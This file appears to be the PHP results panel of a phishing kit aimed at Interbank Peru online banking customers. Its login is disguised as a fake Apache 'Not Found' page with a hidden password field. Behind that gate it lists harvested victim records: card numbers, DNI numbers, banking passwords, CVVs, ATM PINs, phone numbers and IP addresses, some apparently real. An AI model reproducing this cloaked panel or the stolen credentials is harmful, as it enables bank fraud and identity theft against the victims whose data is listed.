<?php
error_reporting(0);
session_start();
$auth_pass = "06bb0180fcf96d9dfc1f3fdc8c8de6ca";
$x = $_GET["lupe"]; if ($x == ""){ $x = "true"; }
else{ $x; } $pass = $x;
if($pass == "true"){
if(!isset($_SESSION["logueado"])) {
if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))) {
$_SESSION["logueado"] = true; }
else { panel(); }}}
function panel() {
	die(" <h1>Not Found</h1>
    <p>The requested URL $_SERVER[HTTP_HOST].$_SERVER[REQUEST_URI] was not found on this server.</p>
    <hr>
    <address>Apache/2.4.12 (Unix) OpenSSL/1.0.1e-fips mod_bwlimited/1.4 Server at $_SERVER[HTTP_HOST] Port 80</address>
        <style>
            input { margin:0;border:1px solid #fff; }
        </style>
	<pre align=center><br><br><br><br><br><br><br><br><br><br><br><form method=post><input type=\"password\" name=\"pass\" size=\"2\" maxlength=\"6\" style=\"outline:none; border:none; color: #000;\">
</form></pre>"); }
/*=================================*/
if($_GET["opc"] == "salir") { 
/*=================================*/
session_start();
session_destroy();
$file = basename($_SERVER['PHP_SELF']);
echo "<script type=\"text/javascript\">document.location = \"$file\";</script>"; }
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<script language="JavaScript">
function Salir(){
	var __confirm = confirm("Vuelve Pronto");
	if( !__confirm ){ return false ; }
	window.location = "<?=basename($_SERVER['PHP_SELF']);?>";
}
</script>
</head>
<body>
<a href="?opc=salir" onClick="Salir();" style="float:left;"><font face="Verdana" size="2" color="#E10000">Logout</font></a><br>-------------------- [132.184.129.149] --------------------<br><br>
Tarjeta: 4213550035034534<br>
DNI: 34343434343<br>
Clave: 599toddc<br><br>
Bitel: 945545454<br><br>
Tarjeta: 4213 5500 3503 4534<br>
Vencimiento: [02/19] MM/YY<br>
CVV: 4545<br>
ATM: 4545<br>
Saldo: <br><br>
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36<br><br>
------------------------------------------------------------------------<br>
https://bancaporinternet.interbank.com.pe/Warhol/login<br>
------------------------------------------------------------------------<br><br>-------------------- [132.184.129.149] --------------------<br><br>
Tarjeta: 4213550089005758<br>
DNI: 43434343434<br>
Clave: 15ujgf6ihhhn<br><br>
Entel: 545454554<br><br>
Tarjeta: 4213 5500 8900 5758<br>
Vencimiento: [01/19] MM/YY<br>
CVV: 445<br>
ATM: 4333<br>
Saldo: <br><br>
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36<br><br>
------------------------------------------------------------------------<br>
https://bancaporinternet.interbank.com.pe/Warhol/login<br>
------------------------------------------------------------------------<br><br>-------------------- [132.184.129.149] --------------------<br><br>
Tarjeta: 4213550086786786<br>
DNI: 76867876876<br>
Clave: 1594polñooo<br><br>
Bitel: 944857575<br><br>
Tarjeta: 4213 5500 8678 6786<br>
Vencimiento: [03/21] MM/YY<br>
CVV: 135<br>
ATM: 5679<br>
Saldo: <br><br>
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36<br><br>
------------------------------------------------------------------------<br>
https://bancaporinternet.interbank.com.pe/Warhol/login<br>
------------------------------------------------------------------------<br><br>-------------------- [190.235.179.65] --------------------<br><br>
Tarjeta: 4213550039512669<br>
DNI: 48398300<br>
Clave: esteaany30<br><br>
Claro: 967736732<br><br>
Tarjeta: 4213 5500 3951 2669<br>
Vencimiento: [02/22] MM/YY<br>
CVV: 365<br>
ATM: 1930<br>
Saldo: <br><br>
Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36<br><br>
------------------------------------------------------------------------<br>
https://bancaporinternet.interbank.com.pe/Warhol/login<br>
------------------------------------------------------------------------<br><br>-------------------- [179.7.193.197] --------------------<br><br>
Tarjeta: 4213550061236708<br>
DNI: 70153725<br>
Clave: djluis19<br><br>
Claro: 992558334<br><br>
Tarjeta: 4213 5500 6123 6708<br>
Vencimiento: [09/23] MM/YY<br>
CVV: 733<br>
ATM: 1919<br>
Saldo: <br><br>
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36<br><br>
------------------------------------------------------------------------<br>
https://bancaporinternet.interbank.com.pe/Warhol/login<br>
------------------------------------------------------------------------<br><br>-------------------- [190.12.94.150] --------------------<br><br>
Tarjeta: 4213550056539116<br>
DNI: 42295486<br>
Clave: 201984<br><br>
Bitel: 910460350<br><br>
Tarjeta: 4213 5500 5653 9116<br>
Vencimiento: [05/23] MM/YY<br>
CVV: 333<br>
ATM: 1984<br>
Saldo: <br><br>
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36<br><br>
------------------------------------------------------------------------<br>
https://bancaporinternet.interbank.com.pe/Warhol/login<br>
------------------------------------------------------------------------<br><br>-------------------- [190.12.94.150] --------------------<br><br>
Tarjeta: 4213550056539116<br>
DNI: 42295486<br>
Clave: 201984<br><br>
Bitel: 910460350<br><br>
Tarjeta: 4213 5500 5653 9116<br>
Vencimiento: [05/23] MM/YY<br>
CVV: 333<br>
ATM: 1984<br>
Saldo: <br><br>
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36<br><br>
------------------------------------------------------------------------<br>
https://bancaporinternet.interbank.com.pe/Warhol/login<br>
------------------------------------------------------------------------<br><br>